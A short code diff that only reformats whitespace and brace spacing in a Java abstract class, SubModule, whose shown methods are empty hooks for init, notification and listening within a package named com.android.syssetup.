@@ -4,19 +4,19 @@ import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.evidence.Markup;
 
 public abstract class SubModule {
-	
+
 	protected Markup markup;
 	protected BaseModule module;
-	
+
 	protected boolean enabled = true;
-	
-	public final void init(BaseModule module, Markup markup){
+
+	public final void init(BaseModule module, Markup markup) {
 		this.markup = markup;
 		this.module = module;
 		enabled = true;
 		init();
 	}
-	
+
 	protected void init() {
 	}
 
@@ -39,7 +39,7 @@ public abstract class SubModule {
 	public int notification(ProcessInfo process) {
 		return 0;
 	}
-	
+
 	protected void startListen() {
 	}
 
